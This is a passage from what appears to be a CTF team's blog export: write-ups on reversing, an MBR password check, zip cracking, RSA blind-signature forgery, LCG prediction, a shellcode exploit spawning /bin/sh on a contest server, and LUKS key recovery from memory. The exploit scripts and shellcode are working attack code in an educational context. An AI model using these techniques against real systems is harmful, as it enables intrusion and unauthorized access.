fileOutputStream.write(arrayOfByte4, 0, arrayOfByte4.length); fileOutputStream.flush(); fileOutputStream.close(); &#125;&#125; Now compiling it with javac and running with java commands we get stage2: 1234$ javac wtf.java $ java Code2$ file stage2.bin stage2.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=FBY_TepBaPVEzlo3-SXy/Zsd256T1rd3lPJ9tnxng/YgTlqVI_KVISIMJ6lZi7/tIlG0PXO43MvY1MOVlul, not stripped Stage2 (golang binary)Now we have a 64bit ELF, this a go binary , this one is very similar to the previous challenge but kind of harder to reverse since is go, this time instead of the system username the directory name is used to encrypt the file: Once again after this, a verification of an encrypted folder is done before trying to decrypt the stage3 file: After this I created a folder named abcdefghijklmnopq which has 0x11 (17 in decimal) of size, I inserted a break point at cmp dl, bl and dumped the encrypted string abcdefghijklmnopq and the original encrypted string folder name which is present in the binary. First getting the encrypted bytes of the folder I created:Second get the encrypted bytes of the original folder: We have everything we need to recover the original folder name! Since is xor encryption we just need to get the bytes of the encrypted string abcdefghijklmnopq xor it with the plaintext abcdefghijklmnopq and finally xor with encrypted original name reversing the all thing, I used a python script to do this: 123456a = [0x59,0xCD,0xC9,0x90,0xE9,0x6E,0x9F,0x23,0x4B,0xAF,0x0B,0x33,0xCC,0x39,0x03,0xDB,0xA0]cp =[0x53,0xdd,0xc5,0x87,0xe4,0x63,0x99,0x14,0x4f,0xa4,0x14,0x2d,0xc4,0x24,0x04,0xc0,0xb0]key = ''for i,c in enumerate('abcdefghijklmnopq'): key += chr(ord(c) ^ a[i] ^ cp[i])print key Getting the original folder name 12$ python qwd.py kroshka_matreshka To dump the final file just move the binary to a folder named kroshka_matreshka Stage 3 (python pyc file)This stage is the easiest one we just need to decompile the .pyc with https://pypi.org/project/uncompyle6/ and we end up with this: 12345678910111213141516171819def decode(data, key): idx = 0 res = [] for c in data: res.append(chr(c ^ ord(key[idx]))) idx = (idx + 1) % len(key) return resflag = [ 40, 11, 82, 58, 93, 82, 64, 76, 6, 70, 100, 26, 7, 4, 123, 124, 127, 45, 1, 125, 107, 115, 0, 2, 31, 15]print('Enter key to get flag:')key = input()if len(key) != 8: print('Invalid len') quit()res = decode(flag, key)print(''.join(res)) Once again xor encryption since we already know the first 8 bytes of the flag as “cybrics{“ if we xor this with the first bytes of the encrypted flag we will get the key it’s easy to write a python script for this: 1234567c = [40, 11, 82, 58, 93, 82, 64, 76, 6, 70, 100, 26, 7, 4, 123, 124, 127, 45, 1, 125, 107, 115, 0, 2, 31, 15]x = 0key = ''for i in 'cybrics&#123;': key += chr(ord(i) ^ c[x]) x += 1print key Getting the key 12python roflmao.py Kr0H4137 The key was Kr0H4137, using it to decrypt the flag: 1234$ python3 result.pyEnter key to get flag:Kr0H4137cybrics&#123;M4TR35HK4_15_B35T&#125; The flag was cybrics{M4TR35HK4_15_B35T}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"go","slug":"go","permalink":"https://teamrocketist.github.io/tags/go/"},{"name":"java","slug":"java","permalink":"https://teamrocketist.github.io/tags/java/"}]},{"title":"[Reverse] Midnightsun CTF 2019 - Hfs-mbr","slug":"Reverse-Midnightsun-CTF-2019-Hfs-mbr","date":"2019-04-06T21:22:16.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2019/04/06/Reverse-Midnightsun-CTF-2019-Hfs-mbr/","link":"","permalink":"https://teamrocketist.github.io/2019/04/06/Reverse-Midnightsun-CTF-2019-Hfs-mbr/","excerpt":"","text":"Hfs-mbr 213 Description:We made a military-grade secure OS for HFS members. Feel free to beta test it for us!Service: stty -icanon -echo ; nc hfs-os-01.play.midnightsunctf.se 31337 ; stty saneDownload: hfs-os.tar.gz First all I want to thank Midnightsun CTF organizers for such an amazing CTF even that I didn’t have much time to play it due to IRL responsibilities, the few challenges I solved, I learned a lot, it was worth the time invested unlike the time I invested on EncryptCTF where I learned nothing. The most awesome of this is challenge is actually the organizers gave instructions on a README file on how to debug this kind of MBR challenges on ida I always debugged this using gdb which is alot harder to analyse and debug specially when both gef and pwndbg get bugged and stop working leaving you to work on vanilla gdb which is beyond crazy. So after extracting we get a bunch of files: 12$ lsbin/ dos.img hfs-os.tar.gz notes.txt README run* If we read the README we can get some instruction on how to debug on IDA 12345678$ cat READMEHFS-OS./run debug (gdb stub) or ./runHow to debug with IDAIn IDA &gt; Debugger &gt; Attach &gt; Remote debugger (host:1234) &gt; (Debug options &gt; Set specific options, UNCHECK 'software breakpoints at eip+1', CHECK 'use CS:IP in real mode') &gt; OK When attached, Debugger &gt; Manual memory regions &gt; Insert &gt; CHECK 16bit segment &gt; OK In the IDA-View, press G, 0x7c00 is where the bootloader starts. Set a BP &gt; F9 If we check up the contents of run file we can see if we add a debug parameter we can already setup qemu running on a gdb server at port 1234 (default port when not specifically set):12345678$ cat run #! /bin/bashif [ \"$1\" = \"debug\" ] ; then cd bin &amp;&amp; ./qemu-system-i386 -s -S -m 16 -k en-us -rtc base=localtime -nographic -drive file=../dos.img -boot order=celse cd bin &amp;&amp; ./qemu-system-i386 -m 16 -k en-us -rtc base=localtime -nographic -drive file=../dos.img -boot order=cfi Configuration IDAYou can skip this chapter if you already know about thsi and you just want to check on my solution to solve the challenge. when opening dos.img change the loading offset to 0x7c00 so ida starts to convert the bytes into assembly form that point: After clicking OK make sure you say no so IDA dissembles it in 16 bit mode: Now we just need to follow the instructions on README file: Select remote gdb debugger: Go to debugger options: Now into set specific options: UNCHECK ‘software breakpoints at eip+1’, CHECK ‘use CS:IP in real mode’ Still on this window click on memory maps: Right click and then insert: Check 16-bit segment and then OK: Go to process options: Set up the hostname to your local ip from your linux machine and change to port to 1234 Solving the problemFirst setup the debugging server but just running:1234$ ./run debugWARNING: Image format was not specified for '../dos.img' and probing guessed raw. Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted. Specify the 'raw' format explicitly to remove the restrictions. Setup a breakpoint on 0x7c00 and start debugging: We can ignore sub_7C0C since is just setting up into video mode if we look up into sub_7C15 (sometimes this bugs out and ida becomes messed up out of the sudden when this happens the only solution I found was to delete IDA database and redo the configuration steps don’t really know why this happens sometimes): After sub7E21 you are going to jump into sub7E06: From the picture above you can see before each call on sub_7E2B if you check on memory for this addresses you will see these are strings of the banner and the message to ask the password for the first part of the challenge: By putting a breaking point on ret and running the binary until it reach you can see it printed the banner: No we jump into loc_7E37: The loose function 0x818a is the address of Wrong password string and sub_7E2B will print it so we want to avoid to jump here: Now interpreting the rest of sub_7E2B The result after jumping: Now if you check the DEADCODE jump after pressing a you can see it after doing its thing it jumps into loc_7FD9: Let’s see what happens if we press e: If we check what happens if we jump to loc_7FCE: Now just do this for every letter and you will end up with a list like this:12345678910111213141516171819202122232425262728a -&gt; deadcodeb -&gt; deadcodec -&gt; deadcoded -&gt; deadcodee -&gt; notdeadcode -&gt; if byte_81BA == 7 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++f -&gt; deadcodeg -&gt; deadcodeh -&gt; deadcodei -&gt; deadcodej -&gt; notdeadcode -&gt; if byte_81BA == 2 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++k -&gt; deadcodel -&gt; deadcodem -&gt; deadcoden -&gt; notdeadcode -&gt; if byte_81BA == 6 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++o -&gt; notdeadcode -&gt; if byte_81BA == 1 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++p -&gt; notdeadcode -&gt; if byte_81BA == 4 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++q -&gt; deadcoder -&gt; notdeadcode -&gt; if byte_81BA == 8 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++s -&gt; notdeadcode -&gt; if byte_81BA == 0 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++t -&gt; deadcodeu -&gt; notdeadcode -&gt; if byte_81BA == 3 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++v -&gt; deadcodew -&gt; notdeadcode -&gt; if byte_81BA == 5 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++x -&gt; deadcodey -&gt; deadcodez -&gt; deadcodedeadcode -&gt; byte_81BA++ The calculations done to calculate the indexes: 12345678910111213141516$ python -c \"print 0x73 ^ 0x73\" # s0$ python -c \"print (0x8e-(0x20))^0x6f\" # o1$ python -c \"print (0x38 + 0x30) ^ 0x6a\" # j2$ python -c \"print (0x88-(5*4))^0x70\" # p4$ python -c \"print (0x82 - 0x10)^0x77\" # w5$ python -c \"print 0x6e ^ 0x68\" # n6$ python -c \"print (0x2 + 0x60)^0x65\" # e7$ python -c \"print (0xac-(0x52-0x20))^0x72\" # r8 The password was sojupwner Getting the flag:12345678910111213[HFS SECURE BOOT] Loading ....-. .-.----.----. .-. .-.----..----. | &#123;_&#125; | &#123;_&#123; &#123;__ | `.' | &#123;&#125; | &#123;&#125; &#125; | &#123; &#125; | | .-._&#125; &#125; | |\\ /| | &#123;&#125; | .-. \\ `-' `-`-' `----' `-' ` `-`----'`-' `-' Enter the correct password to unlock the Operating System[HFS_MBR]&gt; sojupwner....[HFS SECURE SHELL] Here is your flag for HFS-MBR: midnight&#123;w0ah_Sh!t_jU5t_g0t_REALmode&#125; [HFS SECURE SHELL] loaded at 100f:0100 (0x101f0) and ready for some binary carnage! The flag was HFS-MBR: midnight{w0ah_Sh!t_jU5t_g0t_REALmode}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"ida","slug":"ida","permalink":"https://teamrocketist.github.io/tags/ida/"},{"name":"mbr","slug":"mbr","permalink":"https://teamrocketist.github.io/tags/mbr/"}]},{"title":"[Misc] EncryptCTF - crack-jack","slug":"Misc-EncryptCTF-crack-jack","date":"2019-04-05T16:04:06.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/04/05/Misc-EncryptCTF-crack-jack/","link":"","permalink":"https://teamrocketist.github.io/2019/04/05/Misc-EncryptCTF-crack-jack/","excerpt":"","text":"crack-jack 50 Description:Visuals are Deceptive So… Visuals are Deceptive… I guess not only the visuals are deceptive :’)We are publishing this write-up only to show how such an easy problem, that barely has no value compared to the other challenges (50pts), due to the excessive guessing component, can be tricky enough to be only solved by 11 teams out of 696 Let’s get into it.Firstly, we are presented with this image Classic image with a bs flag in it. Surely this flag won’t do anything. We could try to use some steganography tools, but since other problems were meant to be solved using them, lets keep them as our last resort. Let’s binwalk it. After using binwalk it is possible to see that there is a zip archive inside. Let’s extract everything using binwalk -e to automatically extract known file types that exist inside the flag.png file. Displaying everything that is inside the folder we see that exists, besides the zip file, a file named flag.txt. No way it is the real flag. cat‘ed and nothing as expected. Let’s check the zip. unzipwon’t do because it is password protected. What’s inside? A flag.txt inside the password-protected zip? It must be it. The challenge has crack on its name. Let’s crack it! Usually it this cases I use zip2john to get hashed passwords out of the zip archives and then brute-force them using john and a common wordlist ( e.g. rockyou.txt ) Oh well…. No password hashes lef to crack and none was cracked… Usually if rockyou doesn’t work it has to be with some sort of information related to the challenge itself… Hello Guessing Part. Are you there?What can we try? Hmm… this was my line of thought: 1-FAIL: Metadata? - used exiftool on both the zip file and on the initial flag.png. Nahhhh nothing interesting. 2-FAIL: First Image Text? - well, flag.png has some text, such as “ENCRYPT CTF 2019”, “encryptCTF{N0t__7h@7_345y}”, etc… Did a script to use those strings plus the individual words of each string, etc, etc. Guess what? Nothing… 3-CORRECT: Visuals are Deceiving - “what if the visuals (point 2) of an image are there to just deceive us and behind everything we see isn’t the true reality? earth being round or flat doesn’t mean anything because that’s just our visual perception of it and it’s deceiving the true form of it! Nothing that we see can be trusted” - said the author of this challenges when was creating it while tripping out. Don’t get me wrong, I’m just kidding and hope you don’t get offended, but this is a clear representation of my initial statement. A supposedly easy challenge that doesn’t value that much (50pts) that deceives us into trying over and over basic stuff and losing a lot of time because if it is easy it should be done quickly and we are not expecting to be trying to lose time guessing random stuff. Getting back to the solution. Since Visuals are Deceiving. what really matters from that initial flag.png isn’t the image itself but the text of the file. This can be obtained using strings. Getting this text, you can create a wordlist based on it and use it to crack the hash of the zip Bingo! The password is: G^WBC[WLr3. Let’s unzip and view the content of the flag.txt file. There you go. That’s how we did it. Hope we don’t get trash guessing challenges like this ever again… The flag was encryptCTF{C4acK!ng_7h3_Uncr4ck4bl3}","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://teamrocketist.github.io/tags/misc/"},{"name":"encryptCTF","slug":"encryptCTF","permalink":"https://teamrocketist.github.io/tags/encryptCTF/"},{"name":"zip","slug":"zip","permalink":"https://teamrocketist.github.io/tags/zip/"},{"name":"jtr","slug":"jtr","permalink":"https://teamrocketist.github.io/tags/jtr/"},{"name":"zip2john","slug":"zip2john","permalink":"https://teamrocketist.github.io/tags/zip2john/"},{"name":"binwalk","slug":"binwalk","permalink":"https://teamrocketist.github.io/tags/binwalk/"},{"name":"guessing","slug":"guessing","permalink":"https://teamrocketist.github.io/tags/guessing/"}]},{"title":"[Crypto] VolgaCtf2019 - Blind","slug":"Crypto-VolgaCtf2019-Blind","date":"2019-04-01T00:16:26.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/04/01/Crypto-VolgaCtf2019-Blind/","link":"","permalink":"https://teamrocketist.github.io/2019/04/01/Crypto-VolgaCtf2019-Blind/","excerpt":"","text":"Blind 200 Description:Pull the flag…if you can.nc blind.q.2019.volgactf.ru 7070server.py Identifying the problemThe server has a set of commands which a client can use, the commands cat and cd to be executed need to be signed by the servers private key, we don’t have access to that key, but we can sign anything besides the commands cat and cd, looking at the code we can see the server is signing our message directly with unpadded RSA, knowing this we can use RSA’s malleability property to forge a signature. Applying the attackThe signing is done by simply doing: Where: m is the message d is the rsa private exponent n is the modulus We know that RSA is homomorphic to the multiplication this means for example that this is true: To get the flag we need to use the command cat and do something like cat flag to obtain it, so since we can’t do it directly we gotta find an r that modifies our message so it modifies our message to something different than cat , we can then use this property of rsa to forge a signature by nullifying the first division with a multiplication. For example we first sign our message m divided by an r number like this: Now we can just sign the number r: Now we can obtain the final signature we wanted by just multiplying both signatures: Hence resuming what I showed you in the pictures we can trivially divide our challenge by a number r (provided it is in itself considered valid for signing and the challenge is a multiple of it), say 2, sign it and sign the quotient separately, multiply them and apply modular reduction with the public key’s modulus and hence forge the signature. Avoiding some problems encountered because of this particular challengeBecause this challenge is using some specific libraries to parse the commands the output of our sign m/r and r can’t contain for example spaces or quote characters otherwise the server will throw an error when using shlex.split(message), the spaces because it’s going to split into multiple commands and the server will only sign part of the command, and the quotes really throws errors if they aren’t closed or escaped so I wrote an function find a valid r: 1234567891011# Lazy way to find a valid r valuefor x in xrange(r_,99999999999): try: m = safe_unhexlify(M/x) t = shlex.split(m) b = len(t) == 1 except ValueError: # some characters like quotes and shit can fuck up the signing because of shlex.split continue if(M % x == 0 and b): r_ = x break The valid r ended up being the number 408479, the full code to this challenge is: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *from binascii import unhexlify,hexlifyimport base64import shleximport reN = 26507591511689883990023896389022361811173033984051016489514421457013639621509962613332324662222154683066173937658495362448733162728817642341239457485221865493926211958117034923747221236176204216845182311004742474549095130306550623190917480615151093941494688906907516349433681015204941620716162038586590895058816430264415335805881575305773073358135217732591500750773744464142282514963376379623449776844046465746330691788777566563856886778143019387464133144867446731438967247646981498812182658347753229511846953659235528803754112114516623201792727787856347729085966824435377279429992530935232902223909659507613583396967e = 65537def safe_unhexlify(n): if len(\"%x\" % n) % 2 != 0: m = unhexlify(\"0\"+(\"%x\" % n)) else: m = unhexlify(\"%x\" % n) return m def sign(message, dont_skip=True): if (dont_skip): print r.recvuntil(\"Enter your command:\\r\\n\") r.sendline(\"sign \"+\"sign\") r.sendline(base64.b64encode(message)) return re.findall(r'\\d+',r.recvuntil(\"Enter your command:\\r\\n\"))[0]def cat(signature, command): r.sendline(str(signature) + \" \" + command) print r.recv()r_ = 2r = remote('blind.q.2019.volgactf.ru',7070)M = int(hexlify(\"cat flag\"), 16)# Lazy way to find a valid r valuefor x in xrange(r_,99999999999): try: m = safe_unhexlify(M/x) t = shlex.split(m) b = len(t) == 1 except ValueError: # some characters like quotes and shit can fuck up the signing because of shlex.split continue if(M % x == 0 and b): r_ = x breakprint \"r=%d and M=%d\" % (r_,M)mBlinded = sign(m) # M / r_sBlinded = sign(safe_unhexlify(r_), False)S = (int(mBlinded) * int(sBlinded)) % Ncat(S,\"cat flag\")r.close() Now running it and obtaining the flag: 12345678$ python blind.py[+] Opening connection to blind.q.2019.volgactf.ru on port 7070: Doner=408479 and M=7161132565001953639Enter your command:VolgaCTF&#123;B1ind_y0ur_tru3_int3nti0n5&#125;[*] Closed connection to blind.q.2019.volgactf.ru port 7070","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://teamrocketist.github.io/tags/RSA/"},{"name":"volgactf2019","slug":"volgactf2019","permalink":"https://teamrocketist.github.io/tags/volgactf2019/"},{"name":"homomorphic","slug":"homomorphic","permalink":"https://teamrocketist.github.io/tags/homomorphic/"},{"name":"blindSignatures","slug":"blindSignatures","permalink":"https://teamrocketist.github.io/tags/blindSignatures/"}]},{"title":"[Crypto] VolgaCtf2019 - LG","slug":"Crypto-VolgaCtf2019-LG","date":"2019-03-31T15:19:21.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/03/31/Crypto-VolgaCtf2019-LG/","link":"","permalink":"https://teamrocketist.github.io/2019/03/31/Crypto-VolgaCtf2019-LG/","excerpt":"","text":"LG 100 Description:WazzUP! My homie bought a new UltraSmartTV, but he forgot a secret key from an admin panel. After a few attempts to crack this “smart” IoT device it started to generate new passwords on its own, and now we are stuck. Identifying the problemThe first time I read the description of this task didn’t helped me at all I mean a LG television ? After doing connection with the server I saw the server was giving us some random numbers and asked us to predict the next. Well after this I remembered last year I was looking at an attack against Linear Congruential Generators (LCG) and I thought to myself this is probably a LCG because the title is similar LG. What is a LCG ?LCG can be defined as: Where: X(n) is a sequence of pseudo random values. p is modulo defined as 0 &lt; p a is the multiplier defined as 0 &lt; a &lt; p c is the increment 0 &lt;= c &lt; p ( if c = 0 the LCG is called Multiplicative Congruential Generator) An example implementation of LCG in python:12345678910class LCGPrng(object): def __init__(self, p, a, c): self.p = p self.a = a self.c = c self.x = random.randint(0, p) def next(self): self.x = (self.a*self.x + self.c) % self.p return self.x We have no knowledge of a,c and p and initial seed for x was chosen randomly, this attack is based in George Marsaglia analyzed Pseudo Random Number Generators in which he found a flaw in LCG. This can be done with 2x2 matrix or a 3x3 matrix, I used 2x2 matrix like this guy from here . For example if the out of the generated sequence is: 1234567X(0) = 64302589647963933737451564X(1) = 23099347408308738343740115X(2) = 60779187967701597680605077X(3) = 41531243105709646792416331X(4) = 71461317334046189800115379X(5) = 50094315434186546595562390X(6) = 27719142972686291997765807 From 7 numbers we can generate 4 2x2 matrices like this: If you wanted to do with 3x3 matrices they could be formed like this: The determinant of the matrix is an integer multiple of the modulus p used in LCG. The gcd of two random multiples of p will be p with probability 6/π^2 = 0.61 and if you take the gcd of all of this integers it should provide us the real modulus p with a higher probability. To calculate each determinant of the matrices above you need remember something from linear algebra classes, calculating a determinant from a 2x2 matrix is pretty trivial this can be done with this formula: Note that if you choose to go with the 3x3 matrices the calculation is in a different way. Now the GCD of these matrices should provide us with the real modulus p: 123p0 = GCD(DeterminantOfMatrix0, DeterminantOfMatrix1)p1 = GCD(p0, DeterminantOfMatrix2)P = GCD(p1, DeterminantOfMatrix3) Knowing p we can find a and c by solving simple equations: Finding a:Finding c:The next number is given by: The equivalent code to solve this is: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import sysimport mathimport randomfrom pwn import *def calc_det(i,j,X): \"\"\" Calculate the values for the matrix[lattice] \"\"\" a1 = X[i] - X[0] b1 = X[i+1] - X[1] a2 = X[j] - X[0] b2 = X[j+1] - X[1] \"\"\" Calculate the determinant \"\"\" det = a1*b2 - a2*b1 return abs(det)def GCD(a,b): \"\"\" Euclidean Algo\"\"\" a = abs(a) b = abs(b) while a: a,b = long(b%a),a return bdef modInverse(a, m): if GCD(a, m) != 1: return None # no mod inverse if a &amp; m aren't relatively prime u1, u2, u3 = 1, 0, a v1, v2, v3 = 0, 1, m while v3 != 0: q = u3 // v3 # // is the integer division operator v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3 return u1 % mdef main(): while True: try: X = [] r = remote('lg.q.2019.volgactf.ru', 8801) r.recvuntil(\"Try this:\\n\") for i in xrange(7): n =int(r.recvline().strip()) print n X.append(n) r.recvuntil(\"&gt;&gt;&gt;\") print '--------------' Det_X = [] Det_X.append(calc_det(1,2,X)) #print Det_X Det_X.append(calc_det(2,3,X)) #print Det_X Det_X.append(calc_det(3,4,X)) #print Det_X Det_X.append(calc_det(4,5,X)) #print Det_X found_p = reduce(GCD, Det_X) # To find 'a' and 'c' we need to solve the simple equation: # a = ((x3 - x4)*INVERSE_MODULE((x2-x3),p))%p # And: # c = (x4 - a*x3)%p # Where x2, x3, x4 are all numbers generated by the LCG that we got already! mod_inv_a = modInverse((X[2]-X[3]), found_p) # Here we find the modular inverse of x2-x3 with modulo p found_a = ((X[3] - X[4])*mod_inv_a)%found_p print found_a #found_a will be the correct a with high probability. found_c = (X[4] - found_a*X[3])%found_p print found_c #found_c will be the correct a with high probability, clearly depending on the correctness of a print \"Found: %d as P, %d as a and %d as c\" % (found_p, found_a, found_c) r.sendline(str((found_a * X[-1] + found_c) % found_p)) print r.recvall() r.close() break except TypeError: r.close()if __name__ == \"__main__\": sys.exit(main()) Running it:123456789101112131415161718$ python lol.py[+] Opening connection to lg.q.2019.volgactf.ru on port 8801: Done64708864023319939604022646518381540211898163541863792266147303737567749205101567787858287294194078929082655436130269655437579177566874743547788780197541492952410286788865373905332250--------------8376594058363858569363859597516389311801873802Found: 83765940583638585693638595 as P, 9751638931180187 as a and 3802 as c[+] Receiving all data: Done (64B)[*] Closed connection to lg.q.2019.volgactf.ru port 8801CONGRATULATIONS!VolgaCTF&#123;pR3d1ct1ng_1s_n0t_oNlY_f0r_0O0rAculs&#125; The flag was VolgaCTF{pR3d1ct1ng_1s_n0t_oNlY_f0r_0O0rAculs}","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"lcg","slug":"lcg","permalink":"https://teamrocketist.github.io/tags/lcg/"},{"name":"randomness","slug":"randomness","permalink":"https://teamrocketist.github.io/tags/randomness/"},{"name":"volgactf2019","slug":"volgactf2019","permalink":"https://teamrocketist.github.io/tags/volgactf2019/"}]},{"title":"[Pwn] BsidesSF 2019 - runitplusplus","slug":"Pwn-BsidesSF-2019-runitplusplus","date":"2019-03-06T02:17:09.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/03/06/Pwn-BsidesSF-2019-runitplusplus/","link":"","permalink":"https://teamrocketist.github.io/2019/03/06/Pwn-BsidesSF-2019-runitplusplus/","excerpt":"","text":"runitplusplus 52 Description:This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353 runitplusplus As the description says this is the same as the runit challenge but with a bit of reversing: The shell code I used for this was \\x31\\xC0\\x31\\xD2\\x31\\xC0\\x31\\xD2\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xE1\\xB0\\x0B\\xCD\\x80, if we use this website to check what this shellcode does: Everything looks right we are clearing EAX and EDX in the beginning, we are pushing the bin/sh string into the stack and put its address ECX the EDX must be zero because it’s the envp argument and EAX is 0xb which is the execve system call number, so now we just need to reverse this shell code, we can use python to do that in my case I used [::-1] which reverses the string: 1234567891011121314151617181920from pwn import *host = 'runitplusplus-a36bf652.challenges.bsidessf.net'port = 5353local = Truefilename = 'runitplusplus'def getConn(): #d = os.environ #d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253' return process(filename) if local else remote(host, port)SHELLCODE = '\\x31\\xC0\\x31\\xD2\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xE1\\xB0\\x0B\\xCD\\x80'[::-1]r = getConn()gdb.attach(r, ''' b *0x8048680 c ''')print r.recv()r.sendline(SHELLCODE)r.interactive() So lets put a break point right on the address 0x8048680 which is right before the program does CALL EAX and do a step in and lets what what happened to the shell code after running that for loop: So to circumvent this what I did is to repeat the first 4 bytes of my shell code which was the code for xor eax,eax and xor edx,edx: So we need to add this to our original shell code and we get this \\x31\\xC0\\x31\\xD2\\x31\\xC0\\x31\\xD2\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xE1\\xB0\\x0B\\xCD\\x80 which in assembly is: So lets check how it looks in gdb with the breakpoint: Now that everything is fine we are ready to run the script on the server: 1234567891011121314151617181920from pwn import *host = 'runitplusplus-a36bf652.challenges.bsidessf.net'port = 5353local = Falsefilename = 'runitplusplus'def getConn(): #d = os.environ #d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253' return process(filename) if local else remote(host, port)SHELLCODE = '\\x31\\xC0\\x31\\xD2\\x31\\xC0\\x31\\xD2\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xE1\\xB0\\x0B\\xCD\\x80'[::-1]r = getConn()#gdb.attach(r, '''# b *0x8048680# c# ''')print r.recv()r.sendline(SHELLCODE)r.interactive() Now running it: 123456789101112$ python runitplusplus.py [+] Opening connection to runitplusplus-a36bf652.challenges.bsidessf.net on port 5353: DoneSend me stuff!![*] Switching to interactive mode$ cat home/ctf/flag.txt&#123;ti_nar_uoy&#125;FTC[*] Got EOF while reading in interactive$ $ [*] Closed connection to runitplusplus-a36bf652.challenges.bsidessf.net port 5353[*] Got EOF while sending in interactive The flag was {ti_nar_uoy}FTC","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"}],"tags":[{"name":"bsidesSF","slug":"bsidesSF","permalink":"https://teamrocketist.github.io/tags/bsidesSF/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"shellcode","slug":"shellcode","permalink":"https://teamrocketist.github.io/tags/shellcode/"}]},{"title":"[Forensics] BsidesSF 2019 - goodluks3","slug":"Forensics-BsidesSF-2019-goodluks3","date":"2019-03-05T22:57:04.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/03/05/Forensics-BsidesSF-2019-goodluks3/","link":"","permalink":"https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks3/","excerpt":"","text":"goodluks3 Description:Our third suspect was caught with a running machine with the encrypted disk mounted.We captured the whole hard drive and system memory for you. Can you help us?(Please note, this is a rather large file!) https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks3.7zSolved After extracting this 7z file we get an image (goodluks3.img) and a memory dump (goodluks3.mem), eventually I tried to use volatility to analyse the memory but It was way too slow and I still needed to find a profile for this specific linux machine which is always a mess. Normally when you have a luks encryption disk and a memory dump in this kind of ctf challenges the objective is normally to find the master key within the dump. So I tried to use aesfindkey on the memory dump but It didn’t find anything, after this I started to look for a different tool and I found this one: 123456$ ./findaes ../goodluks3.memSearching ../goodluks3.memFound AES-256 key schedule at offset 0x895dd88: b0 7a 29 f5 44 15 47 76 57 04 6e ec d3 03 f5 bd af a4 e6 df b2 71 01 ab af 7e 22 e1 23 94 15 f5 Found AES-256 key schedule at offset 0x895df78: 8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a It found two AES-256 keys, It is time to set up our loop device from the luks image, so lets look at the partitions on parted: 12345678910111213141516171819$ sudo parted goodluks3.imgGNU Parted 3.2Using ~/ctf/bctf/forensics/goodluks3/goodluks3.imgWelcome to GNU Parted! Type 'help' to view a list of commands.(parted) U Unit? [compact]? B (parted) print Model: (file)Disk ~/ctf/bctf/forensics/goodluks3/goodluks3.img: 4294967296BSector size (logical/physical): 512B/512BPartition Table: msdosDisk Flags: Number Start End Size Type File system Flags 1 1048576B 2999975935B 2998927360B primary ext4 boot 2 2999975936B 4000317439B 1000341504B primary 3 4000317440B 4293918719B 293601280B primary linux-swap(v1)(parted) We want to set a loop device on number 2 which its offset starts at 2999975936B so lets use losetup: 1$ sudo losetup --offset 2999975936 /dev/loop0 goodluks3.img And now lets convert one of the dumped keys into a file and decode them into ASCII: 1$ echo &apos;8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a&apos; | tr -d &apos; &apos; | xxd -r -p &gt; key0 Lets try to decrypt now: 12sudo cryptsetup luksOpen --master-key-file key0 /dev/loop14 decryptedCannot read 64 bytes from keyfile key0. And we got an error ? They expected a 64 byte key 